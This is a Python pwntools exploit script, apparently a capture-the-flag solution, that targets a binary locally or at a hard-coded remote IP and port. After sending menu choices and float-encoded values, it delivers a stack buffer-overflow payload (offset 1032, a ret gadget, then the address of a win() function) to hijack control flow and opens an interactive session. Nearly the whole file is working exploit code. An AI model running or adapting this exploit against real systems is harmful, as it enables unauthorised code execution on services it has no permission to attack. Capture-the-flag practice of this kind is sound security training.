#!/usr/bin/python3
from pwn import *

# =========================================================
#                          SETUP                         
# =========================================================
exe = './test' # <-- change this
elf = context.binary = ELF(exe, checksec=True)
libc = '/lib/x86_64-linux-gnu/libc.so.6'
libc = ELF(libc, checksec=False)
context.log_level = 'debug'
context.terminal = ["tmux", "splitw", "-h"]
host, port = '34.42.177.219', 31100 # <-- change this

def initialize(argv=[]):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript)
    elif args.REMOTE:
        return remote(host, port)
    else:
        return process([exe] + argv)

gdbscript = '''
init-pwndbg
break Backdoor()
break win()
'''.format(**locals())


# =========================================================
#                         NOTES
# =========================================================
def hexToFloat(h):
    h = hex(h)[2:].rjust(16, '0')
    d = struct.unpack('>d', bytes.fromhex(h))[0]
    return str(d)


# =========================================================
#                         EXPLOITS
# =========================================================
def exploit():
    global io
    io = initialize()
    rop = ROP(exe)
    
    io.sendline(b'1')
    num1 = hexToFloat(0x69)
    num2 = hexToFloat(0x420)
    win = 0x0000000000401740
    
    io.sendlineafter(b'> ', num1.encode())
    io.sendlineafter(b'> ', num2.encode())
    io.sendlineafter(b'> ', b'1337')
    
    offset = 1032
    payload = flat({
        offset: [
            rop.ret.address,
            win
        ]
    })
    
    io.sendlineafter(b'> ', payload)
    io.interactive()
    
if __name__ == '__main__':
    exploit()